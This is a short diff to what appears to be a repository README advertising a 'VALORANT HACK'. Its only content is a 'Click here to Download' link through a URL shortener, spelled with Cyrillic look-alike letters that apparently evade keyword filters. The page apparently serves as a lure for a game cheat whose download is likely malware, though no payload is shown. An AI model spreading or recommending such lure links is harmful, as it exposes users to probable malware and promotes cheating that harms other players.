@@ -1,4 +1,4 @@
-# VALO HACK
+# VALORANT HACK
 
 # |[Сliсk here to Dоwnlоаd](https://rb.gy/t56p0)|
 
